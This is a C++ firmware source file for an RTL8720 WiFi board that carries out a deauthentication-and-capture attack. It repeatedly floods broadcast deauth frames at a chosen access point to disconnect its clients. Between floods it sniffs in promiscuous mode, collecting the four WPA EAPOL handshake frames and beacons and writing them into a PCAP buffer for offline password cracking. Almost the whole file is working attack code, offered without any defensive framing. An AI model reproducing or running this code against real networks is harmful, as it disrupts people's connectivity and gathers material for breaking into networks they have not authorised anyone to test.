// Define a structure for storing handshake data.
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

uint8_t deauth_bssid[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint16_t deauth_reason;

bool readyToSniff = false;
bool sniffer_active = false;
bool isHandshakeCaptured = false;


std::vector<uint8_t> pcapData;

// Global flag to indicate that the sniff callback has been triggered.
volatile bool sniffCallbackTriggered = false;

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

// Helper function: returns the offset at which the EAPOL payload starts
// Find the offset where the LLC+EAPOL signature starts.
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) {
        match = false;
        break;
      }
    }
    if (match) return i;
  }
  return 0; // if not found, return 0 (compare full frame)
}

// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

ManagementData capturedManagement;

// --- PCAP Structures ---
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// --- External Variables ---
// These are defined in your main file.
extern struct HandshakeData capturedHandshake;
extern struct ManagementData capturedManagement;

// Minimal Radiotap header (8 bytes)
const uint8_t minimal_rtap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};


std::vector<uint8_t> generatePcapBuffer() {
  pcapData.clear();

  // Build and append the global header.
  PcapGlobalHeader gh;
  gh.magic_number = 0xa1b2c3d4; // Little-endian magic number
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = 65535;
  gh.network = 127; // DLT_IEEE802_11_RADIO

  uint8_t* ghPtr = (uint8_t*)&gh;
  for (size_t i = 0; i < sizeof(gh); i++) {
    pcapData.push_back(ghPtr[i]);
  }

  // Helper lambda to write one packet.
  auto writePacket = [&](const uint8_t* packetData, size_t packetLength) {
    PcapPacketHeader ph;
    unsigned long ms = millis();
    ph.ts_sec = ms / 1000;
    ph.ts_usec = (ms % 1000) * 1000;
    ph.incl_len = packetLength + sizeof(minimal_rtap);
    ph.orig_len = packetLength + sizeof(minimal_rtap);

    uint8_t* phPtr = (uint8_t*)&ph;
    for (size_t i = 0; i < sizeof(ph); i++) {
      pcapData.push_back(phPtr[i]);
    }
    // Append Radiotap header.
    for (size_t i = 0; i < sizeof(minimal_rtap); i++) {
      pcapData.push_back(minimal_rtap[i]);
    }
    // Append packet data.
    for (size_t i = 0; i < packetLength; i++) {
      pcapData.push_back(packetData[i]);
    }
  };

  // Write handshake frames.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    writePacket(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length);
  }
  // Write management frames.
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    writePacket(capturedManagement.frames[i].data, capturedManagement.frames[i].length);
  }

  return pcapData;
}

// Function to reset both handshake and management frame data.
void resetCaptureData() {
  //std::vector<uint8_t> pcapData;
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}

void printHandshakeData() {
  Serial.println(F("---- Captured Handshake Data ----"));
  Serial.print(F("Total handshake frames captured: "));
  Serial.println(capturedHandshake.frameCount);
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print(F("Frame "));
    Serial.print(i + 1);
    Serial.print(F(" ("));
    Serial.print(hf.length);
    Serial.println(F(" bytes):"));
    
    // Print hex data in a formatted manner.
    for (unsigned int j = 0; j < hf.length; j++) {
      // Print a newline every 16 bytes with offset
      if (j % 16 == 0) {
        Serial.println();
        Serial.print(F("0x"));
        Serial.print(j, HEX);
        Serial.print(F(": "));
      }
      // Print leading zero if needed.
      if (hf.data[j] < 16) {
        Serial.print(F("0"));
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println(F("--------------------------------"));
  }
  Serial.println(F("---- End of Handshake Data ----"));
}

void deauthAndSniff() {
  sniffer_active = true;
  // Reset capture buffers.
  resetCaptureData();

  memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
  // Set the channel to the target AP's channel.
  wifi_set_channel(_selectedNetwork.ch);
  Serial.print(F("Switched to channel: "));
  Serial.println(_selectedNetwork.ch);

  // Overall timeout for the entire cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 10000; // 10 Seconds timeout is enough

  // Phase durations.
  const unsigned long deauthInterval = 500; // deauth phase (0.5 sec)
  const unsigned long sniffInterval = 3000;  // sniff phase (3 sec)

  bool cancelled = false;
  
  // Outer loop: alternate deauth and sniff until handshake complete,
  // timeout, or cancellation.

  // Enable promiscous mode BUT keep SoftAP active
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - overallStart < overallTimeout)) {
          
          /*
           * Code space for displaying information during sniffing
           */
    // Before performing deauth and sniff, feed the client with some beacons by switching to origin channel
    // this is essential to prevent client from disconnecting
    wifi_set_channel(AP_Channel.toInt());
    delay(200);
    // Then return to target's channel
    wifi_set_channel(_selectedNetwork.ch);

    // ----- Deauth Phase -----
    Serial.println(F("Starting deauth phase..."));
    unsigned long deauthPhaseStart = millis();
    while (millis() - deauthPhaseStart < deauthInterval) {      
      
      wifi_set_channel(_selectedNetwork.ch);
      deauth_reason = 1;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      
      // Changed to smaller delay to allow larger amount of deauth flood
      delay(16);

    }

    // ----- Sniff Phase -----
    Serial.println(F("Starting sniff phase..."));

    // No need to disable promiscuous mode, RTL8720 can run both SoftAP and promiscuous mode :)
    //wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
    
    unsigned long sniffPhaseStart = millis();

    while (millis() - sniffPhaseStart < sniffInterval) {
      delay(16);
      // If handshake is complete, exit early.
      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
          capturedManagement.frameCount > 0) {
        break;
      }
    }

    // Feeds client with beacons again 
    wifi_set_channel(AP_Channel.toInt());
    delay(200);
    // Then return to target's channel
    wifi_set_channel(_selectedNetwork.ch);

    // No need to disable promiscuous mode, RTL8720 can run both SoftAP and promiscuous mode :)
    //wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    
      // Exit early if handshake complete.
      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
          capturedManagement.frameCount > 0) {
        break;
      }
    }
    

    Serial.print(F("Current handshake count: "));
    Serial.println(capturedHandshake.frameCount);
  
  
  // ----- Final Display Update -----
  

  if (cancelled) {
    /*
     * Code space for displaying sniffing status canceled
     */
  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
             capturedManagement.frameCount > 0) {

    wifi_set_channel(AP_Channel.toInt());
    
    std::vector<uint8_t> pcapData = generatePcapBuffer();
    Serial.print(F("PCAP size: "));
    Serial.print(pcapData.size());
    Serial.println(F(" bytes"));
    isHandshakeCaptured = true;
              
    /*
     * Code space for displaying sniffing status finished
     */
    printHandshakeData();
   

  } else {
    /*
     * Code space for displaying sniffing status failed due to timeout
     */
  }
  
  // Disable promiscuous mode and return to origin channel
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  wifi_set_channel(AP_Channel.toInt());

  Serial.println(F("Finished deauth+sniff cycle."));
  readyToSniff = false;
  sniffer_active = false;
}

// Helper function: extract frame type and subtype from the first two bytes.
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  // Frame Control field is in the first two bytes (little endian)
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;      // bits 2-3
  subtype = (fc >> 4) & 0x0F;   // bits 4-7
}

void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  sniffCallbackTriggered = true;
  
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);
  
  // --- Capture Management Frames (Beacons/Probe Responses) ---
  if (type == 0) {  // Management
    if (subtype == 8 || subtype == 5) { // Beacon or Probe Response
      if (capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
        Serial.print("Stored management frame count: ");
        Serial.println(capturedManagement.frameCount);
      }
    }
  }
  
  // --- Capture EAPOL (Handshake) Frames ---
  // Check for LLC+EAPOL signature: AA AA 03 00 00 00 88 8E
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) { isEAPOL = true; break; }
  }
  
  if (isEAPOL) {
    Serial.println("EAPOL frame detected!");
    
    // Create a temporary handshake frame
    HandshakeFrame newFrame;
    newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
    memcpy(newFrame.data, packet, newFrame.length);
    
    // Extract the sequence control from the MAC header.
    unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
    // And find the EAPOL payload offset.
    unsigned int payloadOffset = findEAPOLPayloadOffset(newFrame.data, newFrame.length);
    unsigned int newPayloadLength = (payloadOffset < newFrame.length) ? (newFrame.length - payloadOffset) : newFrame.length;
    
    bool duplicate = false;
    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      HandshakeFrame *stored = &capturedHandshake.frames[i];
      unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
      unsigned int storedPayloadOffset = findEAPOLPayloadOffset(stored->data, stored->length);
      unsigned int storedPayloadLength = (storedPayloadOffset < stored->length) ? (stored->length - storedPayloadOffset) : stored->length;
      
      // First check: if sequence numbers differ, they are different frames.
      if (storedSeq == seqControl) {
        // Now compare the payload portion.
        if (storedPayloadLength == newPayloadLength &&
            memcmp(stored->data + storedPayloadOffset, newFrame.data + payloadOffset, newPayloadLength) == 0) {
          duplicate = true;
          Serial.print("Duplicate handshake frame (seq 0x");
          Serial.print(seqControl, HEX);
          Serial.println(") detected, ignoring.");
          break;
        }
      }
    }
    
    if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
      memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
      capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
      capturedHandshake.frameCount++;
      Serial.print("Stored handshake frame count: ");
      Serial.println(capturedHandshake.frameCount);
      if (capturedHandshake.frameCount == MAX_HANDSHAKE_FRAMES) {
        Serial.println("Complete handshake captured!");
      }
    }
  }
}
